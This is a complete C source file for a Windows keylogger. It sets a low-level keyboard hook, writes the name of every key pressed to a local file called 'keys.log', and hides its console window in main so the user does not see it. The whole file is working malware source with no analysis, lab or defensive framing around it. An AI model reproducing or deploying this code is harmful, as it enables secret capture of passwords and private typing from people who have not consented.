
#define _WIN32_WINNT 0x0400 
#include <windows.h> 
#include <winuser.h> 
#include <stdio.h> 
#include<windowsx.h>

HHOOK hKeyHook; 
__declspec(dllexport) LRESULT CALLBACK KeyEvent ( 
  int nCode,      
  WPARAM wParam,  
  LPARAM lParam   
) { 
    if  ((nCode == HC_ACTION) &&       // HC_ACTION means we may process this event 
        ((wParam == WM_SYSKEYDOWN) ||  // Only react if either a system key ... 
        (wParam == WM_KEYDOWN)))       // ... or a normal key have been pressed. 
    { 
        KBDLLHOOKSTRUCT hooked = 
            *((KBDLLHOOKSTRUCT*)lParam); 
        DWORD dwMsg = 1; 
        dwMsg += hooked.scanCode << 16; 
        dwMsg += hooked.flags << 24; 
        char lpszName[0x100] = {0}; 
        lpszName[0] = '['; 
        int i = GetKeyNameText(dwMsg, 
            (lpszName+1),0xFF) + 1; 
        lpszName[i] = ']'; 
        FILE *file; 
        file=fopen("keys.log","a+"); 
        fputs(lpszName,file); 
        fflush(file); 
    } 
    return CallNextHookEx(hKeyHook, 
        nCode,wParam,lParam); 
} 
void MsgLoop() 
{ 
    MSG message; 
    while (GetMessage(&message,NULL,0,0)) { 
        TranslateMessage( &message ); 
        DispatchMessage( &message ); 
    } 
} 
DWORD WINAPI KeyLogger(LPVOID lpParameter) 
{ 
    HINSTANCE hExe = GetModuleHandle(NULL); 
    if (!hExe) hExe = LoadLibrary((LPCSTR) lpParameter); 
    if (!hExe) return 1; 
    hKeyHook = SetWindowsHookEx (  
        WH_KEYBOARD_LL,            
        (HOOKPROC) KeyEvent,       
        hExe,                      
        NULL                       
    ); 
    MsgLoop(); 
    UnhookWindowsHookEx(hKeyHook); 
    return 0; 
} 
int main(int argc, char** argv) 
{ 
   HWND stealth; 
   AllocConsole();
   stealth=FindWindowA("ConsoleWindowClass",NULL);
   ShowWindow(stealth,0);
    HANDLE hThread; 
    DWORD dwThread; 
    DWORD exThread; 
    hThread = CreateThread(NULL,NULL,(LPTHREAD_START_ROUTINE) 
        KeyLogger, (LPVOID) argv[0], NULL, &dwThread); 
    if (hThread) { 
        return WaitForSingleObject(hThread,INFINITE); 
    } else { 
        return 1; 
    } 
}